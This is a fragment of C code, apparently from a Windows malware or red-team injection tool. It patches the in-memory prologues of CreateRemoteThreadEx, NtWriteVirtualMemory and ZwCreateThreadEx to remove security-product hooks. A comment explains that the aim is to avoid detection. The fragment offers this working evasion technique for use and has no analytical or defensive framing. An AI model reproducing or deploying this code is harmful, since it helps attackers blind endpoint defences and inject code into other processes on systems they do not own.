    HANDLE kernalbase_handle = GetModuleHandle("kernelbase");

    LPVOID CRT_address = GetProcAddress((HMODULE)kernalbase_handle, "CreateRemoteThreadEx");

    printf("[+] CreateRemoteThreadEx address is : %p\n", CRT_address);


    if (WriteProcessMemory(GetCurrentProcess(), CRT_address, "\x4C\x8B\xDC\x53\x56", 5, NULL)) {

        printf("[+] CreateRemoteThreadEx unhooking done!\n");
    }

    // Patch 2 to unhook NtWriteVirtualMemory (ntdll.dll) 
    // Unhooked it because it gets detected while calling it multiple times

    HANDLE ntdll_handle = GetModuleHandle("ntdll");

    LPVOID NtWriteVirtualMemory_Address = GetProcAddress((HMODULE)ntdll_handle, "NtWriteVirtualMemory");

    printf("[+] NtWriteVirtualMemory address is : %p\n", NtWriteVirtualMemory_Address);



    if (WriteProcessMemory(GetCurrentProcess(), NtWriteVirtualMemory_Address, "\x4C\x8B\xD1\xB8\x3A", 5, NULL)) {

        printf("[+] NtWriteVirtualMemory unkooking done!\n");
    }

    // Patch 3 to unhook ZwCreateThreadEx (ntdll.dll)

    LPVOID ZWCreateThreadEx_address = GetProcAddress((HMODULE)ntdll_handle, "ZwCreateThreadEx");

    printf("[+] ZwCreateThreadEx address is : %p\n", ZWCreateThreadEx_address);


    if (WriteProcessMemory(GetCurrentProcess(), ZWCreateThreadEx_address, "\x4C\x8B\xD1\xB8\xC1", 5, NULL)) {

        printf("[+] ZwCreateThreadEx unhooking done!\n");
    }
